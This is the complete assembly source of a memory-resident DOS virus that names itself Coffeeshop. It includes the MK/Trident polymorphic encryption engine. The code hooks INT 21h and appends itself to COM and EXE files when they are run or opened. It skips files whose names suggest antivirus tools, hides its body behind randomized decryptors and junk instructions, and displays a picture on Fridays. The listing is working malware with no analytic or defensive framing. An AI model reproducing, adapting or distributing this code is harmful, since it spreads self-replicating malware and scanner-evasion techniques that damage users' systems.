                .RADIX  16


_TEXT           segment

                assume  cs:_TEXT, ds:_TEXT


VERSION         equ     3
PICLEN          equ     last - beeld            ;length of picture routine
FILELEN         equ     last - first            ;length of virus
FILEPAR         equ     (FILELEN + 0F)/10       ;length of virus in paragraphs
VIRPAR          equ     00D0                    ;space for resident virus
WORKPAR         equ     0160                    ;work space for engine
STACKOFF        equ     1000                    ;Stack offset
DATAPAR         equ     0050                    ;extra memory allocated
BUFLEN          equ     1C                      ;length of buffer


;****************************************************************************
;*              data area for virus
;****************************************************************************

                org     00E0

mutstack        dw      0, 0
oldlen          dw      0, 0
oi21            dw      0, 0
minibuf         db      0, 0, 0, 0


;****************************************************************************
;*              data area for engine
;****************************************************************************

add_val         dw      0
xor_val         dw      0
xor_offset      dw      0
where_len       dw      0
where_len2      dw      0
flags           db      0


;******************************************************************************
;*              Begin of virus, installation in memory
;******************************************************************************

                org     0100

first:          call    next                    ;get IP
next:           pop     si

                sub     si,low 3                ;SI = begin virus
                mov     di,0100
                cld

                push    ax                      ;save registers
                push    ds
                push    es
                push    di
                push    si

                mov     ah,30                   ;DOS version >= 3.1?
                int     21
                xchg    ah,al
                cmp     ax,030A
                jb      not_install

                mov     ax,33DA                 ;already resident?
                int     21
                cmp     ah,0A5
                je      not_install

                mov     ax,es                   ;adjust memory-size
                dec     ax
                mov     ds,ax
                xor     bx,bx
                cmp     byte ptr [bx],5A
                jne     not_install
                mov     ax,[bx+3]
                sub     ax,(VIRPAR+WORKPAR)
                jb      not_install
                mov     [bx+3],ax
                sub     word ptr ds:[bx+12],(VIRPAR+WORKPAR)

                mov     es,[bx+12]              ;copy program to top
                push    cs
                pop     ds
                mov     cx,FILELEN
        rep     movsb

                push    es
                pop     ds

                mov     ax,3521                 ;get original int21 vector
                int     21
                mov     ds:[oi21],bx
                mov     ds:[oi21+2],es

                mov     dx,offset ni21          ;install new int21 handler
                mov     ax,2521
                int     21

                mov     ax,33DBh                ;init. random nr. generator
                int     21

                mov     ah,2A                   ;ask date
                int     21
                cmp     al,5                    ;friday ?
                jne     not_install
                mov     ah,2C                   ;ask time
                int     21
                or      dh,dh                   ;sec = 0 ?
                jnz     not_install
                
                mov     ax,33DC                 ;show picture
                int     21

not_install:    pop     si                      ;restore registers
                pop     di
                pop     es
                pop     ds
                pop     ax

                add     si,(offset buffer)
                sub     si,di
                cmp     byte ptr cs:[si],4Dh    ;COM or EXE ?
                je      entryE

entryC:         push    di
                mov     cx,BUFLEN
        rep     movsb
                ret

entryE:         mov     bx,ds                   ;calculate CS
                add     bx,low 10
                mov     cx,bx
                add     bx,cs:[si+0E]
                cli                             ;restore SS and SP
                mov     ss,bx
                mov     sp,cs:[si+10]
                sti
                add     cx,cs:[si+16]
                push    cx                      ;push new CS on stack
                push    cs:[si+14]              ;push new IP on stack
                db      0CBh                    ;retf


;******************************************************************************
;*              Interupt 24 handler
;******************************************************************************

ni24:           mov     al,3                    ;to avoid 'Abort, Retry, ...'
                iret


;******************************************************************************
;*              Interupt 21 handler
;******************************************************************************

ni21:           pushf

                cmp     ax,33DA                 ;install-check ?
                jne     not_ic
                mov     ax,0A500+VERSION        ;return a signature
                popf
                iret

not_ic:         push    es                      ;save registers
                push    ds
                push    si
                push    di
                push    dx
                push    cx
                push    bx
                push    ax

                cmp     ax,33DBh                ;rnd init ?
                jne     not_ri
                call    rnd_init
                jmp     short no_infect

not_ri:         cmp     ax,33DC                 ;show picture?
                je      show_pic

not_pi:         cmp     ax,4B00                 ;execute ?
                je      do_it

                cmp     ax,6C00                 ;open DOS 4.0+ ?
                jne     no_infect
                test    bl,3
                jnz     no_infect
                mov     dx,di

do_it:          call    infect

no_infect:      pop     ax                      ;restore registers
                pop     bx
                pop     cx
                pop     dx
                pop     di
                pop     si
                pop     ds
                pop     es
                popf

org21:          jmp     dword ptr cs:[oi21]     ;call to old int-handler


;******************************************************************************
;*              Show picture
;******************************************************************************

show_pic:       mov     ax,offset no_infect     ;push return adres on stack
                push    cs
                push    ax

                mov     di,((VIRPAR*10)+0100)   ;move picture routine
                mov     si,offset beeld
                mov     cx,PICLEN
                push    cs
                pop     ds
                push    cs
                pop     es
        rep     movsb

                mov     ax,cs                   ;calculate segment registers
                add     ax,low VIRPAR
                mov     ds,ax
                mov     es,ax

                push    ax                      ;push picture adres on stack
                mov     ax,0100
                push    ax

                db      0CBh                    ;(retf) goto picture routine


;******************************************************************************
;*              Tries to infect the file
;******************************************************************************

infect:         cld

                push    cs                      ;copy filename to CS:0000
                pop     es
                mov     si,dx
                xor     di,di
                mov     cx,0080
namemove:       lodsb
                cmp     al,0
                je      moved
                cmp     al,'a'
                jb      char_ok
                cmp     al,'z'
                ja      char_ok
                xor     al,20                   ;convert to upper case
char_ok:        stosb
                loop    namemove
return0:        ret

moved:          stosb                           ;put last zero after filename
                lea     si,[di-5]
                push    cs
                pop     ds
                
                lodsw                           ;check extension .COM or .EXE
                cmp     ax,'E.'
                jne     not_exe
                lodsw
                cmp     ax,'EX'
                jmp     short check

not_exe:        cmp     ax,'C.'
                jne     return0
                lodsw
                cmp     ax,'MO'
check:          jne     return0

                std                             ;find begin of filename
                mov     cx,si
                inc     cx
searchbegin:    lodsb
                cmp     al,':'
                je      checkname
                cmp     al,'\'
                je      checkname
                loop    searchbegin
                dec     si

checkname:      cld                             ;check filename
                lodsw
                lodsw
                mov     di,offset names
                mov     cl,13
        repnz   scasw
                je      return0

                mov     ax,3300                 ;get ctrl-break flag
                int     21
                push    dx                      ;save flag on stack

                cwd                             ;clear the flag
                inc     ax
                push    ax
                int     21

                mov     ax,3524                 ;get int24 vector
                int     21
                push    es                      ;save vector on stack
                push    bx

                push    cs
                pop     ds

                mov     dx,offset ni24          ;install new int24 handler
                mov     ah,25
                push    ax
                int     21

                mov     ax,4300                 ;ask file-attributes
                cwd
                int     21
                push    cx                      ;save attributes on stack

                xor     cx,cx                   ;clear attributes
                mov     ax,4301
                push    ax
                int     21
                jc      return1v

                mov     ax,3D02                 ;open the file
                int     21
                jnc     opened
return1v:       jmp     return1

opened:         xchg    ax,bx                   ;save handle

                mov     ax,5700                 ;get file date & time
                int     21
                push    dx                      ;save date & time on stack
                push    cx

                mov     cx,BUFLEN               ;read begin of file
                mov     si,offset buffer
                mov     dx,si
                call    read
                jc      closev

                mov     ax,4202                 ;goto end, get filelength
                xor     cx,cx
                cwd
                int     21

                mov     di,offset oldlen        ;save filelength
                mov     [di],ax
                mov     [di+2],dx

                mov     ax,word ptr [si+12]     ;already infected?
                add     al,ah
                cmp     al,'@'
                jz      closev

                cmp     word ptr [si],'ZM'      ;EXE ?
                je      do_EXE

do_COM:         test    byte ptr [si],80        ;maybe a strange EXE?
                jz      closev

                mov     ax,word ptr [di]        ;check lenght of file
                cmp     ah,0D0
                jae     closev
                cmp     ah,1
                jb      closev

                mov     dx,ax
                add     dx,0100
                call    writeprog               ;call Engine and write virus
                jne     closev

                mov     byte ptr [si],0E9       ;put 'JMP xxxx' at begin
                sub     ax,low 3
                mov     word ptr [si+1],ax
                jmp     done

closev:         jmp     close

do_EXE:         cmp     word ptr [si+18],40     ;is it a windows/OS2 EXE ?
                jb      not_win

                mov     ax,003C
                cwd
                call    readbytes
                jc      closev

                mov     ax,word ptr [di+8]
                mov     dx,word ptr [di+0A]
                call    readbytes
                jc      closev
                
                cmp     byte ptr [di+9],'E'
                je      closev

not_win:        call    getlen
                call    calclen                 ;check for internal overlays
                cmp     word ptr [si+4],ax
                jne     close
                cmp     word ptr [si+2],dx
                jne     close

                cmp     word ptr [si+0C],0      ;high memory allocation?
                je      close

                cmp     word ptr [si+1A],0      ;overlay nr. not zero?
                jne     close

                call    getlen                  ;calculate new CS & IP
                mov     cx,0010
                div     cx
                sub     ax,word ptr [si+8]
                dec     ax
                add     dx,low 10

                call    writeprog               ;call Engine and write virus
                jne     close

                mov     word ptr [si+16],ax     ;put CS in header
                mov     word ptr [si+0E],ax     ;put SS in header
                mov     word ptr [si+14],dx     ;put IP in header
                mov     word ptr [si+10],STACKOFF  ;put SP in header

                call    getlen
                add     ax,cx
                adc     dx,0
                call    calclen                 ;put new length in header
                mov     word ptr [si+4],ax
                mov     word ptr [si+2],dx

                lea     di,[si+0A]              ;adjust mem. allocation info
                call    mem_adjust
                lea     di,[si+0C]
                call    mem_adjust

done:           call    gotobegin
                call    rnd_get                 ;signature
                mov     ah,'@'
                sub     ah,al
                mov     word ptr [si+12],ax
                mov     cx,BUFLEN               ;write new begin
                mov     dx,si
                mov     ah,40
                int     21

close:          pop     cx                      ;restore date & time
                pop     dx
                mov     ax,5701
                int     21

                mov     ah,3E                   ;close the file
                int     21

return1:        pop     ax                      ;restore attributes
                pop     cx
                cwd
                int     21

                pop     ax                      ;restore int24 vector
                pop     dx
                pop     ds
                int     21

                pop     ax                      ;restore ctrl-break flag
                pop     dx
                int     21

                ret


;******************************************************************************
;*              Filenames to avoid
;******************************************************************************

names:          db      'CO', 'SC', 'CL', 'VS', 'NE', 'HT', 'TB', 'VI'
                db      'FI', 'GI', 'RA', 'FE', 'MT', 'BR', 'IM', '  '
                db      '  ', '  ', '  '


;******************************************************************************
;*              Write virus to the program
;******************************************************************************

writeprog:      push    ax                      ;save registers
                push    dx
                push    si
                push    bp
                push    es

                cli
                mov     word ptr [di-4],ss      ;save SS & SP
                mov     word ptr [di-2],sp

                mov     ax,cs                   ;new stack & buffer-segment
                mov     ss,ax
                mov     sp,((VIRPAR + WORKPAR) * 10)
                add     ax,low VIRPAR
                mov     es,ax
                sti

                push    ds

                mov     bp,dx                   ;input parameters for engine
                mov     dx,0100
                mov     cx,FILELEN
                xor     si,si
                mov     al,0Fh

                push    di
                push    bx

                call    crypt                   ;call the Engine

                pop     bx
                pop     di

                push    cx
                push    dx
                mov     ax,4202                 ;goto end
                xor     cx,cx
                cwd
                int     21
                pop     dx
                pop     cx

                mov     ah,40                   ;write virus
                int     21
                cmp     ax,cx                   ;are all bytes written?

                pop     ds

                cli
                mov     ss,word ptr [di-4]      ;restore stack
                mov     sp,word ptr [di-2]
                sti

                pop     es                      ;restore registers
                pop     bp
                pop     si
                pop     dx
                pop     ax

                ret


;******************************************************************************
;*              Adjust mem allocation info in EXE header
;******************************************************************************

mem_adjust:     mov     ax,[di]
                sub     ax,low FILEPAR          ;alloc. may be this much less
                jb      more
                cmp     ax,DATAPAR              ;minimum amount to allocate
                jae     mem_ok
more:           mov     ax,DATAPAR
mem_ok:         mov     [di],ax
                ret


;******************************************************************************
;*              Read a few bytes
;******************************************************************************

readbytes:      call    goto
                mov     dx,offset minibuf
                mov     cx,4
read:           mov     ah,3F
                int     21
                ret


;******************************************************************************
;*              Calculate length for EXE header
;******************************************************************************

calclen:        mov     cx,0200
                div     cx
                or      dx,dx
                jz      no_cor
                inc     ax
no_cor:         ret


;******************************************************************************
;*              Get original length of program
;******************************************************************************

getlen:         mov     ax,[di]
                mov     dx,[di+2]
                ret


;******************************************************************************
;*              Goto new offset DX:AX
;******************************************************************************

gotobegin:      xor     ax,ax
                cwd
goto:           xchg    cx,dx
                xchg    ax,dx
                mov     ax,4200
                int     21
                ret


;****************************************************************************
;*
;*              Encryption Engine
;*
;*
;*      Input:  ES      work segment
;*              DS:DX   code to encrypt
;*              BP      what will be start of decryptor
;*              SI      what will be distance between decryptor and code
;*              CX      length of code
;*              AX      flags: bit 0: DS will not be equal to CS
;*                             bit 1: insert random instructions
;*                             bit 2: put junk before decryptor
;*                             bit 3: preserve AX with decryptor
;*
;*      Output: ES:     work segment (preserved)
;*              DS:DX   decryptor + encrypted code
;*              BP      what will be start of decryptor (preserved)
;*              DI      length of decryptor / offset of encrypted code
;*              CX      length of decryptor + encrypted code
;*              AX      length of encrypted code
;*              (other registers may be trashed)
;*
;****************************************************************************

                db      '[ MK / Trident ]'

crypt:          xor     di,di                   ;di = start of decryptor
                push    dx                      ;save offset of code
                push    si                      ;save future offset of code

                mov     byte ptr ds:[flags],al  ;save flags
                test    al,8                    ;push  AX?
                jz      no_push
                mov     al,50
                stosb

no_push:        call    rnd_get                 ;add a few bytes to cx
                and     ax,1F
                add     cx,ax
                push    cx                      ;save length of code

                call    rnd_get                 ;get random flags
                xchg    ax,bx
                                        ;BX flags:

                                        ;0,1    how to encrypt
                                        ;2,3    which register for encryption
                                        ;4      use byte or word for encrypt
                                        ;5      MOV AL, MOV AH or MOV AX
                                        ;6      MOV CL, MOV CH or MOV CX
                                        ;7      AX or DX

                                        ;8      count up or down
                                        ;9      ADD/SUB/INC/DEC or CMPSW/SCASW
                                        ;A      ADD/SUB or INC/DEC
                                        ;       CMPSW or SCASW
                                        ;B      offset in XOR instruction?
                                        ;C      LOOPNZ or LOOP
                                        ;       SUB CX or DEC CX
                                        ;D      carry with crypt ADD/SUB
                                        ;E      carry with inc ADD/SUB
                                        ;F      XOR instruction value or AX/DX

random:         call    rnd_get                 ;get random encryption value
                or      al,al
                jz      random                  ;again if 0
                mov     ds:[xor_val],ax

                call    do_junk                 ;insert random instructions

                pop     cx

                mov     ax,0111                 ;make flags to remember which
                test    bl,20                   ;  MOV instructions are used
                jnz     z0
                xor     al,07
z0:             test    bl,0C
                jnz     z1
                xor     al,70
z1:             test    bl,40
                jnz     z2
                xor     ah,7
z2:             test    bl,10
                jnz     z3
                and     al,73
z3:             test    bh,80
                jnz     z4
                and     al,70

z4:             mov     dx,ax
mov_lup:        call    rnd_get                 ;put MOV instructions in
                and     ax,000F                 ;  a random order
                cmp     al,0A
                ja      mov_lup

                mov     si,ax
                push    cx                      ;test if MOV already done
                xchg    ax,cx
                mov     ax,1
                shl     ax,cl
                mov     cx,ax
                and     cx,dx
                pop     cx
                jz      mov_lup
                xor     dx,ax                   ;remember which MOV done

                push    dx
                call    do_mov                  ;insert MOV instruction
                call    do_nop                  ;insert a random NOP
                pop     dx

                or      dx,dx                   ;all MOVs done?
                jnz     mov_lup

                push    di                      ;save start of decryptor loop

                call    do_add_ax               ;add a value to AX in loop?
                call    do_nop
                test    bh,20                   ;carry with ADD/SUB ?
                jz      no_clc
                mov     al,0F8
                stosb
no_clc:         mov     word ptr ds:[xor_offset],0
                call    do_xor                  ;place all loop instructions
                call    do_nop
                call    do_add

                pop     dx                      ;get start of decryptor loop

                call    do_loop

                test    byte ptr ds:[flags],8   ;insert POP AX ?
                jz      no_pop
                mov     al,58
                stosb

no_pop:         xor     ax,ax                   ;calculate loop offset
                test    bh,1                    ;up or down?
                jz      v1
                mov     ax,cx
                dec     ax
                test    bl,10                   ;encrypt with byte or word?
                jz      v1
                and     al,0FE
v1:             add     ax,di
                add     ax,bp
                pop     si
                add     ax,si
                sub     ax,word ptr ds:[xor_offset]
                mov     si,word ptr ds:[where_len]
                test    bl,0C                   ;are BL,BH used for encryption?
                jnz     v2
                mov     byte ptr es:[si],al
                mov     si,word ptr ds:[where_len2]
                mov     byte ptr es:[si],ah
                jmp     short v3
v2:             mov     word ptr es:[si],ax

v3:             mov     dx,word ptr ds:[xor_val]   ;encryption value

                pop     si                      ;ds:si = start of code

                push    di                      ;save ptr to encrypted code
                push    cx                      ;save length of encrypted code

                test    bl,10                   ;byte or word?
                jz      blup

                inc     cx                      ;cx = # of crypts (words)
                shr     cx,1

lup:            lodsw                           ;encrypt code (words)
                call    do_encrypt
                stosw
                loop    lup
                jmp     short klaar


blup:           lodsb                           ;encrypt code (bytes)
                xor     dh,dh
                call    do_encrypt
                stosb
                loop    blup

klaar:          mov     cx,di                   ;cx = length decryptpr + code
                pop     ax                      ;ax = length of decrypted code
                pop     di                      ;di = offset encrypted code
                xor     dx,dx                   ;ds:dx = decryptor + cr. code
                push    es
                pop     ds
                ret


;****************************************************************************
;*              encrypt the code
;****************************************************************************

do_encrypt:     add     dx,word ptr ds:[add_val]
                test    bl,2
                jnz     lup1
                xor     ax,dx
                ret

lup1:           test    bl,1
                jnz     lup2
                sub     ax,dx
                ret

lup2:           add     ax,dx
                ret


;****************************************************************************
;*              generate mov reg,xxxx
;****************************************************************************

do_mov:         mov     dx,si
                mov     al,byte ptr ds:[si+mov_byte]
                cmp     dl,4                    ;BX?
                jne     is_not_bx
                call    add_ind
is_not_bx:      test    dl,0C                   ;A*?
                pushf
                jnz     is_not_a
                test    bl,80                   ;A* or D*?
                jz      is_not_a
                add     al,2

is_not_a:       call    alter                   ;insert the MOV

                popf                            ;A*?
                jnz     is_not_a2
                mov     ax,word ptr ds:[xor_val]
                jmp     short sss

is_not_a2:      test    dl,8                    ;B*?
                jnz     is_not_b
                mov     si,offset where_len                
                test    dl,2
                jz      is_not_bh
                add     si,2
is_not_bh:      mov     word ptr ds:[si],di
                jmp     short sss

is_not_b:       mov     ax,cx                   ;C*
                test    bl,10                   ;byte or word encryption?
                jz      sss
                inc     ax                      ;only half the number of bytes
                shr     ax,1
sss:            test    dl,3                    ;byte or word register?
                jz      is_x
                test    dl,2                    ;*H?
                jz      is_not_h
                xchg    al,ah
is_not_h:       stosb
                ret

is_x:           stosw
                ret


;****************************************************************************
;*              insert MOV or alternative for MOV
;****************************************************************************

alter:          push    bx
                push    cx
                push    ax
                call    rnd_get
                xchg    ax,bx
                pop     ax
                test    bl,3                    ;use alternative for MOV?
                jz      no_alter

                push    ax
                and     bx,0F
                and     al,08
                shl     ax,1
                or      bx,ax
                pop     ax

                and     al,7
                mov     cl,9
                xchg    ax,cx
                mul     cl

                add     ax,30C0
                xchg    al,ah
                test    bl,4
                jz      no_sub
                mov     al,28
no_sub:         call    maybe_2
                stosw

                mov     al,80
                call    maybe_2
                stosb

                mov     ax,offset add_mode
                xchg    ax,bx
                and     ax,3
                xlat

                add     al,cl
no_alter:       stosb
                pop     cx
                pop     bx
                ret


;****************************************************************************
;*              insert ADD AX,xxxx
;****************************************************************************

do_add_ax:      push    cx
                mov     si,offset add_val       ;save add-value here
                mov     word ptr ds:[si],0
                mov     ax,bx
                and     ax,8110
                xor     ax,8010
                jnz     no_add_ax               ;use ADD?

                mov     ax,bx
                xor     ah,ah
                mov     cl,3
                div     cl
                or      ah,ah
                jnz     no_add_ax               ;use ADD?

                test    bl,80
                jnz     do_81C2                 ;AX or DX?
                mov     al,5
                stosb
                jmp     short do_add0
do_81C2:        mov     ax,0C281
                stosw
do_add0:        call    rnd_get
                mov     word ptr ds:[si],ax
                stosw
no_add_ax:      pop     cx
                ret


;****************************************************************************
;*              generate encryption command
;****************************************************************************

do_xor:         test    byte ptr ds:[flags],1
                jz      no_cs
                mov     al,2E                   ;insert CS: instruction
                stosb

no_cs:          test    bh,80                   ;type of XOR command
                jz      xor1

                call    get_xor                 ;encrypt with register
                call    do_carry
                call    save_it
                xor     ax,ax
                test    bl,80
                jz      xxxx
                add     al,10
xxxx:           call    add_dir
                test    bh,8
                jnz     yyyy
                stosb
                ret

yyyy:           or      al,80
                stosb             
                call    rnd_get
                stosw
                mov     word ptr ds:[xor_offset],ax
                ret

xor1:           mov     al,080                  ;encrypt with value
                call    save_it
                call    get_xor
                call    do_carry
                call    xxxx
                mov     ax,word ptr ds:[xor_val]
                test    bl,10
                jmp     byte_word


;****************************************************************************
;*              generate increase/decrease command
;****************************************************************************

do_add:         test    bl,8                    ;no CMPSW/SCASW if BX is used
                jz      da0
                test    bh,2                    ;ADD/SUB/INC/DEC or CMPSW/SCASW
                jnz     do_cmpsw

da0:            test    bh,4                    ;ADD/SUB or INC/DEC?
                jz      add1

                mov     al,40                   ;INC/DEC
                test    bh,1                    ;up or down?
                jz      add0
                add     al,8
add0:           call    add_ind
                stosb
                test    bl,10                   ;byte or word?
                jz      return
                stosb                           ;same instruction again
return:         ret

add1:           test    bh,40                   ;ADD/SUB
                jz      no_clc2                 ;carry?
                mov     al,0F8                  ;insert CLC
                stosb
no_clc2:        mov     al,083
                stosb
                mov     al,0C0
                test    bh,1                    ;up or down?
                jz      add2
                mov     al,0E8
add2:           test    bh,40                   ;carry?
                jz      no_ac2
                and     al,0CF
                or      al,10
no_ac2:         call    add_ind
                stosb
                mov     al,1                    ;value to add/sub
save_it:        call    add_1
                stosb
                ret

do_cmpsw:       test    bh,1                    ;up or down?
                jz      no_std
                mov     al,0FDh                 ;insert STD
                stosb
no_std:         test    bh,4                    ;CMPSW or SCASW?
                jz      normal_cmpsw
                test    bl,4                    ;no SCASW if SI is used
                jnz     do_scasw

normal_cmpsw:   mov     al,0A6                  ;CMPSB
                jmp     short save_it
do_scasw:       mov     al,0AE                  ;SCASB
                jmp     short save_it


;****************************************************************************
;*              generate loop command
;****************************************************************************

do_loop:        test    bh,1                    ;no JNE if couting down
                jnz     loop_loop               ;  (prefetch bug!)
                call    rnd_get
                test    al,1                    ;LOOPNZ/LOOP or JNE?
                jnz     cx_loop

loop_loop:      mov     al,0E0
                test    bh,1A                   ;LOOPNZ or LOOP?
                jz      ll0                     ;  no LOOPNZ if xor-offset
                add     al,2                    ;  no LOOPNZ if CMPSW/SCASW
ll0:            stosb
                mov     ax,dx
                sub     ax,di
                dec     ax
                stosb
                ret

cx_loop:        test    bh,10                   ;SUB CX or DEC CX?
                jnz     cxl_dec
                mov     ax,0E983
                stosw
                mov     al,1
                stosb
                jmp     short do_jne                

cxl_dec:        mov     al,49
                stosb
do_jne:         mov     al,75
                jmp     short ll0


;****************************************************************************
;*              add value to AL depending on register type
;****************************************************************************

add_dir:        mov     si,offset dir_change
                jmp     short xx1

add_ind:        mov     si,offset ind_change
xx1:            push    bx
                shr     bl,1
                shr     bl,1
                and     bx,3
                add     al,byte ptr ds:[bx+si]
                pop     bx
                ret


;****************************************************************************
;*              mov encryption command byte to AL
;****************************************************************************

get_xor:        push    bx
                mov     ax,offset how_mode
                xchg    ax,bx
                and     ax,3
                xlat
                pop     bx
                ret


;****************************************************************************
;*              change ADD into ADC
;****************************************************************************

do_carry:       test    bl,2                    ;ADD/SUB used for encryption?
                jz      no_ac
                test    bh,20                   ;carry with (encr.) ADD/SUB?
                jz      no_ac
                and     al,0CF
                or      al,10
no_ac:          ret


;****************************************************************************
;*              change AL (byte/word)
;****************************************************************************

add_1:          test    bl,10
                jz      add_1_ret
                inc     al
add_1_ret:      ret


;****************************************************************************
;*              change AL (byte/word)
;****************************************************************************

maybe_2:        call    add_1
                cmp     al,81                   ;can't touch this
                je      maybe_not
                push    ax
                call    rnd_get
                test    al,1
                pop     ax
                jz      maybe_not
                add     al,2
maybe_not:      ret


;****************************************************************************
;*              get random nop (or not)
;****************************************************************************

do_nop:         test    byte ptr ds:[flags],2
                jz      no_nop
yes_nop:        call    rnd_get
                test    al,3
                jz      nop8
                test    al,2
                jz      nop16
                test    al,1
                jz      nop16x
no_nop:         ret


;****************************************************************************
;*              Insert random instructions
;****************************************************************************

do_junk:        test    byte ptr ds:[flags],4
                jz      no_junk
                call    rnd_get                 ;put a random number of
                and     ax,0F                   ;  dummy instructions before
                inc     ax                      ;  decryptor
                xchg    ax,cx
junk_loop:      call    junk
                loop    junk_loop
no_junk:        ret


;****************************************************************************
;*              get rough random nop (may affect register values)
;****************************************************************************

junk:           call    rnd_get
                and     ax,1E
                jmp     short aa0
nop16x:         call    rnd_get
                and     ax,06
aa0:            xchg    ax,si
                call    rnd_get
                jmp     word ptr ds:[si+junkcals]


;****************************************************************************
;*              NOP and junk addresses
;****************************************************************************

junkcals        dw      offset nop16x0
                dw      offset nop16x1
                dw      offset nop16x2
                dw      offset nop16x3
                dw      offset nop8
                dw      offset nop16
                dw      offset junk6
                dw      offset junk7
                dw      offset junk8
                dw      offset junk9
                dw      offset junkA
                dw      offset junkB
                dw      offset junkC
                dw      offset junkD
                dw      offset junkE
                dw      offset junkF


;****************************************************************************
;*              NOP and junk routines
;****************************************************************************

nop16x0:        and     ax,000F                 ;J* 0000 (conditional)
                or      al,70
                stosw
                ret


nop16x1:        mov     al,0EBh                 ;JMP xxxx / junk
                and     ah,07
                inc     ah
                stosw
                xchg    al,ah                   ;get lenght of bullshit
                cbw
                jmp     fill_bullshit


nop16x2:        call    junkD                   ;XCHG AX,reg / XCHG AX,reg
                stosb
                ret


nop16x3:        call    junkF                   ;INC / DEC or DEC / INC
                xor     al,8
                stosb
                ret


nop8:           push    bx                      ;8-bit NOP
                and     al,7
                mov     bx,offset nop_data8
                xlat
                stosb
                pop     bx
                ret


nop16:          push    bx                      ;16-bit NOP
                and     ax,0303
                mov     bx,offset nop_data16
                xlat
                add     al,ah
                stosb
                call    rnd_get
                and     al,7
                mov     bl,9
                mul     bl
                add     al,0C0
                stosb
                pop     bx
                ret


junk6:          push    cx                      ;CALL xxxx / junk / POP reg
                mov     al,0E8
                and     ah,0F
                inc     ah
                stosw
                xor     al,al
                stosb
                xchg    al,ah
                call    fill_bullshit
                call    do_nop
                call    rnd_get                 ;insert POP reg
                and     al,7
                call    no_sp
                mov     cx,ax
                or      al,58
                stosb

                test    ch,3                    ;more?
                jnz     junk6_ret

                call    do_nop
                mov     ax,0F087                ;insert XCHG SI,reg
                or      ah,cl
                test    ch,8
                jz      j6_1
                mov     al,8Bh
j6_1:           stosw

                call    do_nop
                push    bx
                call    rnd_get
                xchg    ax,bx
                and     bx,0F7FBh               ;insert XOR [SI],xxxx
                or      bl,8
                call    do_xor
                pop     bx
junk6_ret:      pop     cx
                ret


junk7:          and     al,0F                   ;MOV reg,xxxx
                or      al,0B0
                call    no_sp
                stosb
                test    al,8
                pushf
                call    rnd_get
                popf
                jmp     short byte_word


junk8:          and     ah,39                   ;DO r/m,r(8/16)
                or      al,0C0
                call    no_sp
                xchg    al,ah
                stosw
                ret


junk9:          and     al,3Bh                  ;DO r(8/16),r/m
                or      al,2
                and     ah,3F
                call    no_sp2
                call    no_bp
                stosw
                ret


junkA:          and     ah,1                    ;DO rm,xxxx
                or      ax,80C0
                call    no_sp
                xchg    al,ah       
                stosw
                test    al,1
                pushf
                call    rnd_get
                popf
                jmp     short byte_word


junkB:          call    nop8                    ;NOP / LOOP
                mov     ax,0FDE2
                stosw
                ret


junkC:          and     al,09                   ;CMPS* or SCAS*
                test    ah,1
                jz      mov_test
                or      al,0A6
                stosb
                ret
mov_test:       or      al,0A0                  ;MOV AX,[xxxx] or TEST AX,xxxx
                stosb
                cmp     al,0A8
                pushf
                call    rnd_get
                popf
                jmp     short byte_word


junkD:          and     al,07                   ;XCHG AX,reg
                or      al,90
                call    no_sp
                stosb
                ret


junkE:          and     ah,07                   ;PUSH reg / POP reg
                or      ah,50
                mov     al,ah
                or      ah,08
                stosw
                ret


junkF:          and     al,0F                   ;INC / DEC
                or      al,40
                call    no_sp
                stosb
                ret


;****************************************************************************
;*              store a byte or a word
;****************************************************************************

byte_word:      jz      only_byte
                stosw
                ret

only_byte:      stosb
                ret


;****************************************************************************
;*              don't fuck with SP!
;****************************************************************************

no_sp:          push    ax
                and     al,7
                cmp     al,4
                pop     ax
                jnz     no_sp_ret
                and     al,0FBh
no_sp_ret:      ret


;****************************************************************************
;*              don't fuck with SP!
;****************************************************************************

no_sp2:         push    ax
                and     ah,38
                cmp     ah,20
                pop     ax
                jnz     no_sp2_ret
                xor     ah,20
no_sp2_ret:     ret


;****************************************************************************
;*              don't use [BP+..]
;****************************************************************************

no_bp:          test    ah,4
                jnz     no_bp2
                and     ah,0FDh
                ret

no_bp2:         push    ax
                and     ah,7
                cmp     ah,6
                pop     ax
                jnz     no_bp_ret
                or      ah,1
no_bp_ret:      ret


;****************************************************************************
;*              write byte for JMP/CALL and fill with random bullshit
;****************************************************************************

fill_bullshit:  push    cx
                xchg    ax,cx
bull_lup:       call    rnd_get
                stosb
                loop    bull_lup
                pop     cx
                ret


;****************************************************************************
;*              random number generator  (stolen from 'Bomber')
;****************************************************************************

rnd_init:       push    cx
                call    rnd_init0               ;init
                and     ax,000F
                inc     ax
                xchg    ax,cx
random_lup:     call    rnd_get                 ;call random routine a few
                loop    random_lup              ;  times to 'warm up'
                pop     cx
                ret

rnd_init0:      push    dx                      ;initialize generator
                push    cx
                mov     ah,2C
                int     21
                in      al,40
                mov     ah,al
                in      al,40
                xor     ax,cx
                xor     dx,ax
                jmp     short move_rnd

rnd_get:        push    dx                      ;calculate a random number
                push    cx
                push    bx
                mov     ax,0                    ;will be: mov ax,xxxx
                mov     dx,0                    ;  and mov dx,xxxx
                mov     cx,7
rnd_lup:        shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_l2
                inc     al
rnd_l2:         loop    rnd_lup
                pop     bx

move_rnd:       mov     word ptr ds:[rnd_get+4],ax
                mov     word ptr ds:[rnd_get+7],dx
                mov     al,dl
                pop     cx
                pop     dx
                ret


;****************************************************************************
;*              tables for engine
;****************************************************************************

                ;       AX   AL   AH      (BX) BL   BH      CX   CL   CH
mov_byte        db      0B8, 0B0, 0B4, 0, 0B8, 0B3, 0B7, 0, 0B9, 0B1, 0B5

                ;       nop clc  stc  cmc  cli  cld incbp decbp
nop_data8       db      90, 0F8, 0F9, 0F5, 0FA, 0FC, 45,  4Dh

                ;      or and xchg mov
nop_data16      db      8, 20, 84, 88

                ;     bl/bh, bx, si  di
dir_change      db      07, 07, 04, 05
ind_change      db      03, 03, 06, 07


                ;       xor xor add sub
how_mode        db      30, 30, 00, 28

                ;       ?  add  xor  or
add_mode        db      0, 0C8, 0F0, 0C0


;****************************************************************************
;*              text + buffer
;****************************************************************************

                db      ' Amsterdam = COFFEESHOP! '

buffer          db      0CDh, 20                ;original code of dummy program
                db      (BUFLEN-2) dup (?)


;****************************************************************************
;*              the (packed) picture routine
;****************************************************************************
                                                
beeld           db      0BFh, 0A1h, 015h, 090h, 090h, 090h, 090h, 090h
                db      090h, 090h, 090h, 0BEh, 0F9h, 003h, 0B9h, 06Bh
                db      001h, 0FDh, 0F3h, 0A5h, 0FCh, 08Bh, 0F7h, 0BFh
